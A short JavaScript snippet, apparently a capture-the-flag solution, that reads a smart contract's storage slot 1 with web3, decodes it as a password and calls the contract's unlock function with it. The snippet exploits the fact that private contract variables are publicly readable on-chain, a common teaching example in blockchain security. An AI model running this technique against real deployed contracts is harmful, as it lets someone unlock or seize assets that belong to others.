var pwd = null;
await web3.eth.getStorageAt(contract.address, 1, function(er, result)
    {pwd = web3.toAscii(result)});
contract.unlock(pwd);